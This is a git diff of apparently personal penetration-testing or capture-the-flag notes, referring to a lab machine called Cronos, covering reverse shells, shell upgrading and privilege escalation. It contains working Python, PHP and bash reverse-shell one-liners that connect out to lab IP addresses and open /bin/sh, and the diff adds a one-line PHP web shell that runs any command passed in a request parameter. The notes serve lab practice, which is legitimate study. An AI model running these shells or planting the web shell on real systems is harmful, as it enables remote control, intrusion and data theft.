@@ -31,6 +31,15 @@ python -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREA
 python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.16.11",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'
 ```
 
+## Web Shells  
+
+* A php web shell  
+
+```php
+<?php 
+passthru($_REQUEST['cmd']);
+?>
+```  
 
 
 ## Upgrade the Reverse Shell   
@@ -164,12 +173,6 @@ export PATH=$PATH:/tmp
 export PATH=/tmp:$PATH
 ```
 
-____ 
-I have to write more about this 
-* SUID (Set owner User ID)
-
-
-
 <br/>
 
 * `[COMMAND] | tee [FILE NAME]` 
@@ -191,8 +194,7 @@ I have to write more about this
 * The bitch machine Cronos keeps making problems for me and I can't seem to open the admin some times. So I wasn't able to test the ways I'll be mentioning next (I got them from this <a href="https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/">website</a>)  
 
 
-* NetCat 
-  * It can be used to scan for open ports `nc -z -v 10.10.8.8 20-80`.  
+
 
 
 ```console
@@ -201,4 +203,9 @@ php -r '$s=fsockopen("10.10.14.74",1234);shell_exec("/bin/sh -i <&3 >&3 2>&3");'
 $s=fsockopen("10.10.14.74",1234);system("/bin/sh -i <&3 >&3 2>&3");
 
 bash -i >& /dev/tcp/10.10.14.74/1234 0>&1
-```
+```  
+
+
+## SUID  
+
+* You can use the tool `SUID3NUM` to check if any of the files that have the sticky bit are interesting or not.
